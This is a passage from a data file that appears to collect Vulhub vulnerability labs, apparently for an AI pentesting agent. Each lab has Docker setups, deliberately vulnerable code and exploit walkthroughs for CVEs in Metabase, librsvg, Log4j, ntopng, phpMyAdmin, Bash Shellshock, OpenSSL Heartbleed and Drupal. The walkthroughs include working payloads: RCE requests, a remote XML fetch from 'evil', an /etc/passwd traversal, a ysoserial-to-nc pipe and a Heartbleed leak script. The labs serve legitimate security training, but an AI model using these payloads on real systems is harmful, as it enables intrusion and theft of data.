6.1; Win64; x64; Trident/5.0)\nConnection: close\nContent-Type: application/json\nContent-Length: 138\n\n{\n  \"param\": [\n    \"org.springframework.context.support.FileSystemXmlApplicationContext\",\n    \"http://evil/spel.xml\"\n  ]\n}\n```\n\n![](2.png)\n"
  },
  {
    "filename": "CVE-2023-38646.md",
    "filenamenomd": "CVE-2023-38646",
    "filetext": "# Table of Contents\n- /home/yay/pentest-agent/vulhub/sites_no_md/metabase/CVE-2023-38646/docker-compose.yml\n\n## File: /home/yay/pentest-agent/vulhub/sites_no_md/metabase/CVE-2023-38646/docker-compose.yml\n\n- Extension: .yml\n- Language: yaml\n- Size: 95 bytes\n- Created: 2025-04-26 21:29:53\n- Modified: 2025-04-26 17:57:04\n\n### Code\n\n```yaml\nversion: '2'\nservices:\n  web:\n    image: vulhub/metabase:0.46.6\n    ports:\n      - \"3000:3000\"\n\n```\n\n",
    "readme": "# Metabase Pre-Auth JDBC Remote Code Execution (CVE-2023-38646)\n\n[中文版本(Chinese version)](README.zh-cn.md)\n\nMetabase is an open source data analytics platform.\n\nMetabase open source before 0.46.6.1 and Metabase Enterprise before 1.46.6.1 allow unauthenticated attackers to execute arbitrary commands on the server, at the server's privilege level. This issue is caused by JDBC url attacks in the setup request.\n\nReferences:\n\n- <https://blog.assetnote.io/2023/07/22/pre-auth-rce-metabase/>\n- <https://blog.calif.io/p/reproducing-cve-2023-38646-metabase>\n- <https://mp.weixin.qq.com/s/MgfIyq0OJwnKOUF2kBB7TA>\n\n## Vulnerable environment\n\nExecute following command to start a Metabase server 0.46.6:\n\n```\ndocker compose up -d\n```\n\nAfter the server is started, you can browse the `http://your-ip:3000` to see the installation instructions like that:\n\n![](1.png)\n\nFill in your information, and skip the data source form.\n\n## Exploit\n\nFirstly, use following request to retrieve the `setup-token`:\n\n```\nGET /api/session/properties HTTP/1.1\nHost: localhost:3000\nAccept-Encoding: gzip, deflate\nAccept: */*\nAccept-Language: en-US;q=0.9,en;q=0.8\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.5790.110 Safari/537.36\nConnection: close\nCache-Control: max-age=0\n\n\n```\n\n![](2.png)\n\nThe vulnerability can only be exploited by obtaining this setup token.\n\nSecondly, replace your `[setup-token]` into the following request then send it:\n\n```\nPOST /api/setup/validate HTTP/1.1\nHost: localhost:3000\nAccept-Encoding: gzip, deflate\nAccept: */*\nAccept-Language: en-US;q=0.9,en;q=0.8\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.5790.110 Safari/537.36\nConnection: close\nCache-Control: max-age=0\nContent-Type: application/json\nContent-Length: 739\n\n{\n    \"token\": \"[setup-token]\",\n    \"details\":\n    {\n        \"is_on_demand\": false,\n        \"is_full_sync\": false,\n        \"is_sample\": false,\n        \"cache_ttl\": null,\n        \"refingerprint\": false,\n        \"auto_run_queries\": true,\n        \"schedules\":\n        {},\n        \"details\":\n        {\n            \"db\": \"zip:/app/metabase.jar!/sample-database.db;MODE=MSSQLServer;\",\n            \"advanced-options\": false,\n            \"ssl\": true,\n\"init\": \"CREATE TRIGGER shell3 BEFORE SELECT ON INFORMATION_SCHEMA.TABLES AS $$//javascript\\u000A\\u0009java.lang.Runtime.getRuntime().exec('touch /tmp/success')\\u000A$$\"\n        },\n        \"name\": \"an-sec-research-team\",\n        \"engine\": \"h2\"\n    }\n}\n```\n\nAs you can see, `touch /tmp/success` has been executed successfully:\n\n![](3.png)\n"
  },
  {
    "filename": "CVE-2023-38633.md",
    "filenamenomd": "CVE-2023-38633",
    "filetext": "# Table of Contents\n- /home/yay/pentest-agent/vulhub/sites_no_md/librsvg/CVE-2023-38633/docker-compose.yml\n- /home/yay/pentest-agent/vulhub/sites_no_md/librsvg/CVE-2023-38633/index.php\n- /home/yay/pentest-agent/vulhub/sites_no_md/librsvg/CVE-2023-38633/poc.svg\n\n## File: /home/yay/pentest-agent/vulhub/sites_no_md/librsvg/CVE-2023-38633/docker-compose.yml\n\n- Extension: .yml\n- Language: yaml\n- Size: 196 bytes\n- Created: 2025-04-26 21:29:53\n- Modified: 2025-04-26 17:57:04\n\n### Code\n\n```yaml\nversion: '2'\nservices:\n web:\n   image: vulhub/librsvg:2.50.7-php\n   command: php -t /var/www/html -S 0.0.0.0:8080\n   volumes:\n    - ./index.php:/var/www/html/index.php\n   ports:\n    - \"8080:8080\"\n\n```\n\n## File: /home/yay/pentest-agent/vulhub/sites_no_md/librsvg/CVE-2023-38633/index.php\n\n- Extension: .php\n- Language: php\n- Size: 627 bytes\n- Created: 2025-04-26 21:29:53\n- Modified: 2025-04-26 17:57:04\n\n### Code\n\n```php\n<?php\n$newname = '';\nif (!empty($_FILES)) {\n    $ext = pathinfo($_FILES['file_upload']['name'], PATHINFO_EXTENSION);\n    if (!in_array($ext, ['svg'])) {\n        die('Unsupported filetype uploaded.');\n    }\n\n    $newname = uniqid() . '.png';\n    shell_exec(\"rsvg-convert {$_FILES['file_upload']['tmp_name']} > ./{$newname}\");\n}\n?>\n<form method=\"post\" enctype=\"multipart/form-data\">\n    File: <input type=\"file\" name=\"file_upload\">\n    <input type=\"submit\">\n</form>\n<br>\n<?php\nif ($newname):\n?>\n<h1>Your image:</h1>\n<p>\n    <a href=\"./<?=$newname?>\" target=\"_blank\">\n        <img src=\"./<?=$newname?>\">\n    </a>\n</p>\n<?php\nendif;\n```\n\n## File: /home/yay/pentest-agent/vulhub/sites_no_md/librsvg/CVE-2023-38633/poc.svg\n\n- Extension: .svg\n- Language: unknown\n- Size: 400 bytes\n- Created: 2025-04-26 21:29:53\n- Modified: 2025-04-26 17:57:04\n\n### Code\n\n```unknown\n<?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"no\"?>\n<svg width=\"300\" height=\"300\" xmlns:xi=\"http://www.w3.org/2001/XInclude\">\n  <rect width=\"300\" height=\"300\" style=\"fill:rgb(255,255,255);\" />\n  <text x=\"10\" y=\"100\">\n    <xi:include href=\".?../../../../../../../../../../etc/passwd\" parse=\"text\" encoding=\"UTF-8\">\n      <xi:fallback>file not found</xi:fallback>\n    </xi:include>\n  </text>\n</svg>\n\n```\n\n",
    "readme": "# Librsvg XInclude Arbitrary file reading (CVE-2023-38633)\n\n[中文版本(Chinese version)](README.zh-cn.md)\n\nLibrsvg is a free software SVG rendering library written as part of the GNOME project, intended to be lightweight and portable.\n\nA directory traversal problem in the URL decoder of librsvg before 2.56.3 could be used by local or remote attackers to disclose files (on the local filesystem outside of the expected area), as demonstrated by `href=\".?../../../../../../../../../../etc/passwd` in an xi:include element.\n\nReferences:\n\n- <https://www.canva.dev/blog/engineering/when-url-parsers-disagree-cve-2023-38633/>\n- <https://gitlab.gnome.org/GNOME/librsvg/-/issues/996>\n\n## Vulnerable Environment\n\nExecuting following command to start a PHP server that uses librsvg 2.50.7 to handle SVG images:\n\n```\ndocker compose up -d\n```\n\nAfter the server is started, browse `http://your-ip:8080` to see the upload page.\n\n## Exploit\n\nUse `<xi:include>` to read the local file by this POC:\n\n```xml\n<?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"no\"?>\n<svg width=\"300\" height=\"300\" xmlns:xi=\"http://www.w3.org/2001/XInclude\">\n  <rect width=\"300\" height=\"300\" style=\"fill:rgb(255,255,255);\" />\n  <text x=\"10\" y=\"100\">\n    <xi:include href=\".?../../../../../../../../../../etc/passwd\" parse=\"text\" encoding=\"UTF-8\">\n      <xi:fallback>file not found</xi:fallback>\n    </xi:include>\n  </text>\n</svg>\n```\n\nUpload this SVG image to server, you will see the `/etc/passwd` that is embedded in the output image:\n\n![](1.png)\n"
  },
  {
    "filename": "CVE-2017-5645.md",
    "filenamenomd": "CVE-2017-5645",
    "filetext": "# Table of Contents\n- /home/yay/pentest-agent/vulhub/sites_no_md/log4j/CVE-2017-5645/docker-compose.yml\n\n## File: /home/yay/pentest-agent/vulhub/sites_no_md/log4j/CVE-2017-5645/docker-compose.yml\n\n- Extension: .yml\n- Language: yaml\n- Size: 74 bytes\n- Created: 2025-04-26 21:29:53\n- Modified: 2025-04-26 17:57:04\n\n### Code\n\n```yaml\nservices:\n log4j:\n   image: vulhub/log4j:2.8.1\n   ports:\n    - \"4712:4712\"\n```\n\n",
    "readme": "# Apache Log4j TCP Server Deserialization Remote Code Execution (CVE-2017-5645)\n\n[中文版本(Chinese version)](README.zh-cn.md)\n\nApache Log4j is a logging library for Java that supports starting remote logging servers. A security vulnerability exists in versions 2.x before 2.8.2 of Apache Log4j TCP Server. Attackers can exploit this vulnerability to execute arbitrary code.\n\nReferences:\n\n- https://issues.apache.org/jira/browse/LOG4J2-1863\n- https://github.com/pimps/CVE-2017-5645\n\n## Environment Setup\n\nExecute the following command to start a Log4j 2.8.1 TCP server:\n\n```\ndocker compose up -d\n```\n\nAfter the environment starts, a TCP server will be opened on port 4712.\n\nNote: Besides using Vulhub's docker image to set up the environment, we can directly start this TCP server from the command line after downloading the log4j jar files: `java -cp \"log4j-api-2.8.1.jar:log4j-core-2.8.1.jar:jcommander-1.72.jar\" org.apache.logging.log4j.core.net.server.TcpSocketServer`, without needing to use Vulhub or write code.\n\n## Vulnerability Reproduction\n\nWe use ysoserial to generate a payload, then send it directly to the `your-ip:4712` port.\n\n```\njava -jar ysoserial-master-v0.0.5-gb617b7b-16.jar CommonsCollections5 \"touch /tmp/success\" | nc your-ip 4712\n```\n\nThen execute `docker compose exec log4j bash` to enter the container, and you can see that /tmp/success has been successfully created:\n\n![](1.png)\n\nExecute a [reverse shell command](http://www.jackson-t.ca/runtime-exec-payloads.html) to successfully get a shell:\n\n![](2.png)\n"
  },
  {
    "filename": "CVE-2021-28073.md",
    "filenamenomd": "CVE-2021-28073",
    "filetext": "# Table of Contents\n- /home/yay/pentest-agent/vulhub/sites_no_md/ntopng/CVE-2021-28073/poc.py\n- /home/yay/pentest-agent/vulhub/sites_no_md/ntopng/CVE-2021-28073/docker-compose.yml\n\n## File: /home/yay/pentest-agent/vulhub/sites_no_md/ntopng/CVE-2021-28073/poc.py\n\n- Extension: .py\n- Language: python\n- Size: 3126 bytes\n- Created: 2025-04-26 21:29:53\n- Modified: 2025-04-26 17:57:04\n\n### Code\n\n```python\nimport sys\nimport requests\nimport argparse\nimport logging\n\n\ndef is_ntopng() -> bool:\n    response = session.get(base_url, allow_redirects=False)\n    return response.status_code == 302 and '/lua/login.lua' in response.headers.get('Location', '')\n\n\ndef get_base_length() -> int:\n    for i in range(90, 120):\n        url = base_url + '/lua/' + '%2e%2f' * i + 'as_stats.lua.css'\n        response = session.get(url, allow_redirects=False)\n        if response.status_code < 300:\n            return 255 - 1 - i * 2 - len('as_stats.lua')\n\n    for i in range(90, 120):\n        url = base_url + '/lua/' + '%2e%2f' * i + 'get_macs_data.lua.css'\n        response = session.get(url, allow_redirects=False)\n        if response.status_code < 300:\n            return 255 - 1 - i * 2 - len('get_macs_data.lua')\n\n    return -1\n\n\ndef get_padding_length(path: str):\n    padding_length = 255 - 1 - base_length - len(path)\n    if padding_length % 2 == 1:\n        raise RuntimeError(f'path {path} is not support')\n\n    return int(padding_length / 2)\n\n\nlogging.basicConfig(stream=sys.stderr, level=logging.WARNING)\nsession = requests.Session()\nsession.headers['User-Agent'] = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36'\n\n\nif __name__ == '__main__':\n    parser = argparse.ArgumentParser(description='CVE-2021-28073 POC for ntopng.')\n    parser.add_argument('-u', '--url', help='base url for ntopng, eg: http://192.168.1.233:3000', metavar='<URL>', required=True)\n    parser.add_argument('-v', '--verbose', default=False, action='store_true')\n    \n    subparsers = parser.add_subparsers(dest='action')\n\n    baselength_command = subparsers.add_parser('baselength', help='get base path length of ntopng')\n\n    generate_command = subparsers.add_parser('generate', help='generate the authenticate bypass url')\n    generate_command.add_argument('-l', '--length', type=int, help='base path length of target ntopng', metavar='<LENGTH>', required=True)\n    generate_command.add_argument('-p', '--path', help='lua pathname', metavar='<PATH>', required=True)\n\n    generate_command = subparsers.add_parser('include', help='generate the arbitrary file inclusion url')\n    generate_command.add_argument('-l', '--length', type=int, help='base path length of target ntopng', metavar='<LENGTH>', required=True)\n    generate_command.add_argument('-i', '--include', help='path to include', metavar='<PATH>', required=True)\n\n    args = parser.parse_args()\n    if not args.action:\n        parser.print_help()\n        sys.exit(1)\n\n    if args.verbose:\n        logging.basicConfig(stream=sys.stderr, level=logging.DEBUG)\n\n    base_url = args.url.rstrip('/')\n    \n    # check target\n    if not is_ntopng():\n        raise RuntimeError('No Ntopng detected')\n\n    if args.action == 'baselength':\n        base_length = get_base_length()\n        sys.stdout.write(f'ntopng install path length: {base_length}\\n')\n    elif args.action == 'generate':\n        base_length = args.length\n        path = args.path\n        sys.stdout.write(base_url + '/lua/' + '%2e%2f' * get_padding_length(path) + path + '.css\\n')\n\n```\n\n## File: /home/yay/pentest-agent/vulhub/sites_no_md/ntopng/CVE-2021-28073/docker-compose.yml\n\n- Extension: .yml\n- Language: yaml\n- Size: 195 bytes\n- Created: 2025-04-26 21:29:53\n- Modified: 2025-04-26 17:57:04\n\n### Code\n\n```yaml\nversion: '2'\nservices:\n ntopng:\n   image: vulhub/ntopng:4.2\n   depends_on:\n    - redis\n   ports:\n    - \"3000:3000\"\n   environment:\n    REDIS_SERVER: redis:6379\n redis:\n   image: redis:6.2-alpine\n\n```\n\n",
    "readme": "# ntopng Authentication Bypass (CVE-2021-28073)\n\n[中文版本(Chinese version)](README.zh-cn.md)\n\nNtopng is a passive network monitoring tool focused on flows and statistics that can be obtained from the traffic captured by the server.\n\nThere is a authentication bypass vulnerability in ntopng 4.2 and previous versions.\n\nReference link:\n\n- http://noahblog.360.cn/ntopng-multiple-vulnerabilities/\n\n## Vulnerability Environment\n\nExecute the following command to start ntopng:\n\n```\ndocker compose up -d\n```\n\nAfter the server is started, browse the `http://your-ip:3000` to see the login page, whose default password is admin/admin, and the password will be request to reset for the first login.\n\n## Vulnerability Reproduce\n\nAccording to the reference link and the simple [poc.py](poc.py), calculate the length of the ntopng lua directory:\n\n```\npython poc.py --url http://your-ip:3000/ baselength\n```\n\n![](1.png)\n\nIt can be seen that the path length in the Vulhub container is 36.\n\nThen, browse the page or interface that we want to access without authorization, such as `/lua/find_prefs.lua`, and it will be redirected to the login page.\n\nUse POC to generate unauthorized access URL:\n\n```\npython poc.py --url http://your-ip:3000/ generate -l 36 -p find_prefs.lua\n```\n\n![](2.png)\n\nThe interface is able to access without authorization through this URL:\n\n![](3.png)\n"
  },
  {
    "filename": "CVE-2018-12613.md",
    "filenamenomd": "CVE-2018-12613",
    "filetext": "# Table of Contents\n- /home/yay/pentest-agent/vulhub/sites_no_md/phpmyadmin/CVE-2018-12613/docker-compose.yml\n- /home/yay/pentest-agent/vulhub/sites_no_md/phpmyadmin/CVE-2018-12613/config.inc.php\n\n## File: /home/yay/pentest-agent/vulhub/sites_no_md/phpmyadmin/CVE-2018-12613/docker-compose.yml\n\n- Extension: .yml\n- Language: yaml\n- Size: 335 bytes\n- Created: 2025-04-26 21:29:53\n- Modified: 2025-04-26 17:57:04\n\n### Code\n\n```yaml\nversion: '2'\nservices:\n web:\n   image: vulhub/phpmyadmin:4.8.1\n   volumes:\n    - ./config.inc.php:/var/www/html/config.inc.php\n   ports:\n    - \"8080:80\"\n   depends_on:\n    - mysql\n mysql:\n   image: mysql:5.5\n   environment: \n    - MYSQL_RANDOM_ROOT_PASSWORD=yes\n    - MYSQL_DATABASE=test\n    - MYSQL_USER=test\n    - MYSQL_PASSWORD=test\n```\n\n## File: /home/yay/pentest-agent/vulhub/sites_no_md/phpmyadmin/CVE-2018-12613/config.inc.php\n\n- Extension: .php\n- Language: php\n- Size: 715 bytes\n- Created: 2025-04-26 21:29:53\n- Modified: 2025-04-26 17:57:04\n\n### Code\n\n```php\n<?php\n/*\n * Generated configuration file\n * Generated by: phpMyAdmin 4.6.2 setup script\n * Date: Mon, 07 May 2018 10:48:03 +0000\n */\n\n/* Servers configuration */\n$i = 0;\n\n/* Server: mysql [1] */\n$i++;\n$cfg['Servers'][$i]['verbose'] = 'mysql';\n$cfg['Servers'][$i]['host'] = 'mysql';\n$cfg['Servers'][$i]['port'] = 3306;\n$cfg['Servers'][$i]['socket'] = '';\n$cfg['Servers'][$i]['connect_type'] = 'tcp';\n$cfg['Servers'][$i]['auth_type'] = 'config';\n$cfg['Servers'][$i]['user'] = 'test';\n$cfg['Servers'][$i]['password'] = 'test';\n\n/* End of servers configuration */\n\n$cfg['blowfish_secret'] = '5af02eda401ae8.69737537';\n$cfg['DefaultLang'] = 'en';\n$cfg['ServerDefault'] = 1;\n$cfg['UploadDir'] = '';\n$cfg['SaveDir'] = '';\n\n```\n\n",
    "readme": "# phpmyadmin 4.8.1 Remote File Inclusion Vulnerability (CVE-2018-12613)\n\n[中文版本(Chinese version)](README.zh-cn.md)\n\nPhpMyAdmin is a free software tool written in PHP, intended to handle the administration of MySQL over the Web. The vulnerability is in the `index.php`, causing  files iclusion vulnerabilitiy.\n\nReference links:\n\n- https://mp.weixin.qq.com/s/HZcS2HdUtqz10jUEN57aog\n- https://www.phpmyadmin.net/security/PMASA-2018-4/\n\n## Setup\n\nRun the following command to start phpmyadmin 4.8.1:\n\n```\ndocker compose up -d\n```\n\nAfter the environment starts, visit `http://your-ip:8080`. The phpmyadmin is \"config\" mode, so we can login directly.\n\n## Exploit\n\nVisit `http://your-ip:8080/index.php?target=db_sql.php%253f/../../../../../../../../etc/passwd`, the result indicates that the file inclusion vulnerability exist:\n\n![](1.png)\n\nWe can execute `SELECT '<?=phpinfo()?>';`, then check your sessionid (the value of phpMyAdmin in the cookie), and then include the session file:\n\n![](2.png)\n"
  },
  {
    "filename": "CVE-2014-6271.md",
    "filenamenomd": "CVE-2014-6271",
    "filetext": "# Table of Contents\n- /home/yay/pentest-agent/vulhub/sites_no_md/bash/CVE-2014-6271/docker-compose.yml\n- /home/yay/pentest-agent/vulhub/sites_no_md/bash/CVE-2014-6271/safe.cgi\n- /home/yay/pentest-agent/vulhub/sites_no_md/bash/CVE-2014-6271/victim.cgi\n\n## File: /home/yay/pentest-agent/vulhub/sites_no_md/bash/CVE-2014-6271/docker-compose.yml\n\n- Extension: .yml\n- Language: yaml\n- Size: 189 bytes\n- Created: 2025-04-26 21:29:53\n- Modified: 2025-04-26 18:41:15\n\n### Code\n\n```yaml\nversion: '2'\nservices:\n web:\n   image: vulhub/bash:4.3.0-with-httpd\n   ports:\n    - \"8080:80\"\n   volumes:\n    - ./safe.cgi:/var/www/html/safe.cgi\n    - ./victim.cgi:/var/www/html/victim.cgi\n```\n\n## File: /home/yay/pentest-agent/vulhub/sites_no_md/bash/CVE-2014-6271/safe.cgi\n\n- Extension: .cgi\n- Language: unknown\n- Size: 299 bytes\n- Created: 2025-04-26 21:29:53\n- Modified: 2025-04-26 17:57:04\n\n### Code\n\n```unknown\n#!/bin/bash\necho \"Content-type: text/html\"\necho \"\"\necho '<html>'\necho '<head>'\necho '<meta http-equiv=\"Content-Type\" content=\"text/html; charset=utf-8\">'\necho '<title>Bash ShellShock</title>'\necho '</head>'\necho '<body>'\necho '<p>'\necho 'Hello world'\necho '</p>'\necho '</body>'\necho '</html>'\nexit 0\n```\n\n## File: /home/yay/pentest-agent/vulhub/sites_no_md/bash/CVE-2014-6271/victim.cgi\n\n- Extension: .cgi\n- Language: unknown\n- Size: 320 bytes\n- Created: 2025-04-26 21:29:53\n- Modified: 2025-04-26 17:57:04\n\n### Code\n\n```unknown\n#!/usr/local/bash-4.3.0/bin/bash\necho \"Content-type: text/html\"\necho \"\"\necho '<html>'\necho '<head>'\necho '<meta http-equiv=\"Content-Type\" content=\"text/html; charset=utf-8\">'\necho '<title>Bash ShellShock</title>'\necho '</head>'\necho '<body>'\necho '<p>'\necho 'Hello world'\necho '</p>'\necho '</body>'\necho '</html>'\nexit 0\n```\n\n",
    "readme": "# Bash Shellshock Remote Command Injection (CVE-2014-6271)\n\n[中文版本(Chinese version)](README.zh-cn.md)\n\nBuild and run the vulnerable environment：\n\n```\ndocker compose build\ndocker compose up -d\n```\n\nWhen you visit `http://your-ip/` you should see two files:\n\n - safe.cgi\n - victim.cgi\n\nsafe.cgi generated by the latest version of bash, and victim.cgi is the page generated by bash4.3 which is vulnerable to shellshock.\n\nWe can send include our payload in the user-agent string when visiting victim.cgi and the command is executed successfully:\n\n![](1.png)\n\nThe same request sent to safe.cgi is unaffected:\n\n![](2.png)\n"
  },
  {
    "filename": "CVE-2014-0160.md",
    "filenamenomd": "CVE-2014-0160",
    "filetext": "# Table of Contents\n- /home/yay/pentest-agent/vulhub/sites_no_md/openssl/CVE-2014-0160/docker-compose.yml\n- /home/yay/pentest-agent/vulhub/sites_no_md/openssl/CVE-2014-0160/ssltest.py\n- /home/yay/pentest-agent/vulhub/sites_no_md/openssl/CVE-2014-0160/www/index.html\n\n## File: /home/yay/pentest-agent/vulhub/sites_no_md/openssl/CVE-2014-0160/docker-compose.yml\n\n- Extension: .yml\n- Language: yaml\n- Size: 155 bytes\n- Created: 2025-04-26 21:29:53\n- Modified: 2025-04-26 17:57:04\n\n### Code\n\n```yaml\nversion: '2'\nservices:\n nginx:\n   image: vulhub/openssl:1.0.1c-with-nginx\n   volumes:\n    - ./www:/var/www/html\n   ports:\n    - \"8080:80\"\n    - \"8443:443\"\n\n```\n\n## File: /home/yay/pentest-agent/vulhub/sites_no_md/openssl/CVE-2014-0160/ssltest.py\n\n- Extension: .py\n- Language: python\n- Size: 4231 bytes\n- Created: 2025-04-26 21:29:53\n- Modified: 2025-04-26 17:57:04\n\n### Code\n\n```python\n#!/usr/bin/python\n\n# Quick and dirty demonstration of CVE-2014-0160 by Jared Stafford (jspenguin@jspenguin.org)\n# The author disclaims copyright to this source code.\n\nimport sys\nimport struct\nimport socket\nimport time\nimport select\nimport binascii\nimport re\nfrom optparse import OptionParser\n\noptions = OptionParser(usage='%prog server [options]', description='Test for SSL heartbeat vulnerability (CVE-2014-0160)')\noptions.add_option('-p', '--port', type='int', default=443, help='TCP port to test (default: 443)')\n\ndef h2bin(x):\n    return binascii.unhexlify(x.replace(' ', '').replace('\\n', ''))\n\nhello = h2bin('''\n16 03 02 00 dc 01 00 00 d8 03 02 53\n43 5b 90 9d 9b 72 0b bc  0c bc 2b 92 a8 48 97 cf\nbd 39 04 cc 16 0a 85 03  90 9f 77 04 33 d4 de 00\n00 66 c0 14 c0 0a c0 22  c0 21 00 39 00 38 00 88\n00 87 c0 0f c0 05 00 35  00 84 c0 12 c0 08 c0 1c\nc0 1b 00 16 00 13 c0 0d  c0 03 00 0a c0 13 c0 09\nc0 1f c0 1e 00 33 00 32  00 9a 00 99 00 45 00 44\nc0 0e c0 04 00 2f 00 96  00 41 c0 11 c0 07 c0 0c\nc0 02 00 05 00 04 00 15  00 12 00 09 00 14 00 11\n00 08 00 06 00 03 00 ff  01 00 00 49 00 0b 00 04\n03 00 01 02 00 0a 00 34  00 32 00 0e 00 0d 00 19\n00 0b 00 0c 00 18 00 09  00 0a 00 16 00 17 00 08\n00 06 00 07 00 14 00 15  00 04 00 05 00 12 00 13\n00 01 00 02 00 03 00 0f  00 10 00 11 00 23 00 00\n00 0f 00 01 01                                  \n''')\n\nhb = h2bin(''' \n18 03 02 00 03\n01 40 00\n''')\n\ndef hexdump(s: bytes):\n    for b in range(0, len(s), 16):\n        lin = [c for c in s[b : b + 16]]\n        hxdat = ' '.join('%02X' % c for c in lin)\n        pdat = ''.join((chr(c) if 32 <= c <= 126 else '.' )for c in lin)\n        print('  %04x: %-48s %s' % (b, hxdat, pdat))\n    \n    print(\"\")\n\ndef recvall(s, length, timeout=5):\n    endtime = time.time() + timeout\n    rdata = b''\n    remain = length\n    while remain > 0:\n        rtime = endtime - time.time() \n        if rtime < 0:\n            return None\n        r, w, e = select.select([s], [], [], 5)\n        if s in r:\n            data = s.recv(remain)\n            # EOF?\n            if not data:\n                return None\n            rdata += data\n            remain -= len(data)\n    return rdata\n        \n\ndef recvmsg(s):\n    hdr = recvall(s, 5)\n    if hdr is None:\n        print('Unexpected EOF receiving record header - server closed connection')\n        return None, None, None\n    typ, ver, ln = struct.unpack('>BHH', hdr)\n    pay = recvall(s, ln, 10)\n    if pay is None:\n        print('Unexpected EOF receiving record payload - server closed connection')\n        return None, None, None\n    print(' ... received message: type = %d, ver = %04x, length = %d' % (typ, ver, len(pay)))\n    return typ, ver, pay\n\ndef hit_hb(s):\n    s.send(hb)\n    while True:\n        typ, ver, pay = recvmsg(s)\n        if typ is None:\n            print('No heartbeat response received, server likely not vulnerable')\n            return False\n\n        if typ == 24:\n            print('Received heartbeat response:')\n            hexdump(pay)\n            if len(pay) > 3:\n                print('WARNING: server returned more data than it should - server is vulnerable!')\n            else:\n                print('Server processed malformed heartbeat, but did not return any extra data.')\n            return True\n\n        if typ == 21:\n            print('Received alert:')\n            hexdump(pay)\n            print('Server returned error, likely not vulnerable')\n            return False\n\ndef main():\n    opts, args = options.parse_args()\n    if len(args) < 1:\n        options.print_help()\n        return\n\n    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n    print('Connecting...')\n    sys.stdout.flush()\n    s.connect((args[0], opts.port))\n    print('Sending Client Hello...')\n    sys.stdout.flush()\n    s.send(hello)\n    print('Waiting for Server Hello...')\n    sys.stdout.flush()\n    while True:\n        typ, ver, pay = recvmsg(s)\n        if typ == None:\n            print('Server closed connection without sending Server Hello.')\n            return\n        # Look for server hello done message.\n        if typ == 22 and pay[0] == 0x0E:\n            break\n\n    print('Sending heartbeat request...')\n    sys.stdout.flush()\n    s.send(hb)\n    hit_hb(s)\n\nif __name__ == '__main__':\n    main()\n```\n\n## File: /home/yay/pentest-agent/vulhub/sites_no_md/openssl/CVE-2014-0160/www/index.html\n\n- Extension: .html\n- Language: html\n- Size: 161 bytes\n- Created: 2025-04-26 21:29:53\n- Modified: 2025-04-26 17:57:04\n\n### Code\n\n```html\n<html>\n    <head>\n        <meta charset=\"utf-8\">\n        <title>Heartbleed Test</title>\n    </head>\n    <body>\n        <p>Heartbleed Test</p>\n    </body>\n</html>\n```\n\n",
    "readme": "# OpenSSL Heartbleed Memory Leak Leads to Information Disclosure (CVE-2014-0160)\n\n[中文版本(Chinese version)](README.zh-cn.md)\n\nThe Heartbleed Bug is a serious vulnerability in the popular OpenSSL cryptographic software library. This weakness allows stealing the information protected, under normal conditions, by the SSL/TLS encryption used to secure the Internet. SSL/TLS provides communication security and privacy over the Internet for applications such as web, email, instant messaging (IM) and some virtual private networks (VPNs).\n\nThe Heartbleed bug allows anyone on the Internet to read the memory of the systems protected by the vulnerable versions of the OpenSSL software. This compromises the secret keys used to identify the service providers and to encrypt the traffic, the names and passwords of the users and the actual content. This allows attackers to eavesdrop on communications, steal data directly from the services and users and to impersonate services and users.\n\nReferences:\n\n- https://heartbleed.com/\n- https://filippo.io/Heartbleed\n\n## Setup\n\nExecute following command to start a Nginx server with OpenSSL 1.0.1c:\n\n```\ndocker compose up -d\n```\n\nAfter the server is started, browse the `https://your-ip:8443` to see the welcome page.\n\n> We have encountered an error when running this environment where some AMD architecture CPUs were unable to access the https page successfully. If you have a similar problem, try an Intel CPU instead.\n\n## POC\n\nVisit `https://filippo.io/Heartbleed` to check the result:\n\n![](1.png)\n\nRun [ssltest.py](ssltest.py) with Python to obtain sensitive data (such as Cookie):\n\n![](2.png)\n"
  },
  {
    "filename": "CVE-2019-6339.md",
    "filenamenomd": "CVE-2019-6339",
    "filetext": "# Table of Contents\n- /home/yay/pentest-agent/vulhub/sites_no_md/drupal/CVE-2019-6339/docker-compose.yml\n\n## File: /home/yay/pentest-agent/vulhub/sites_no_md/drupal/CVE-2019-6339/docker-compose.yml\n\n- Extension: .yml\n- Language: yaml\n- Size: 71 bytes\n- Created: 2025-04-26 21:29:53\n- Modified: 2025-04-26 17:57:04\n\n### Code\n\n```yaml\nservices:\n web:\n   image: vulhub/drupal:8.5.0\n   ports:\n    - \"8080:80\"\n```\n\n",
    "readme": "# Drupal Remote Code Execution by phar deserialization (CVE-2019-6339)\n\n[中文版本(Chinese version)](README.zh-cn.md)\n\nDrupal is a free and open-source web content management framework written in PHP.\n\nA remote code execution vulnerability exists in Drupal 7.x before 7.62, Drupal 8.5.x before 8.5.9 and 8.6.x before 8.6.6. The vulnerability is caused by improper handling of PHAR deserialization in the file system service, which can lead to remote code execution.\n\nReferences:\n\n- <https://www.drupal.org/sa-core-2019-002>\n- <https://www.zerodayinitiative.com/blog/2019/4/11/a-series-of-unfortunate-images-drupal-1-click-to-rce-exploit-chain-detailed>\n- <https://paper.seebug.org/897/>\n\n## Environment Setup\n\nExecute the following command to start a vulnerable Drupal 8.5.0 server:\n\n```\ndocker compose up -d\n```\n\nAfter the server is started, visit `http://your-ip:8080/` to access the Drupal installation page. Follow the default configuration steps to complete the installation. Since there is no MySQL environment, you can choose SQLite as the database.\n\n## Vulnerability Reproduction\n\nFirst, log in as an administrator and upload an avatar. The avatar image should be a specially crafted PoC file (you can refer to [thezdi/PoC](https://github.com/thezdi/PoC/tree/master/Drupal) for the PoC):\n\n![1](1.png)\n\nBy default, Drupal stores uploaded images in the `/sites/default/files/pictures/<YYYY-MM>/` directory and keeps their original filenames. This information is important for exploiting the vulnerability.\n\nVisit `http://127.0.0.1:8080/admin/config/media/file-system` and enter the path to the previously uploaded image in the \"Temporary directory\" field. For example:\n\n```\nphar://./sites/default/files/pictures/2019-06/blog-ZDI-CAN-7232-cat_0.jpg\n```\n\nSave the configuration to trigger the vulnerability. The successful exploitation will be confirmed by 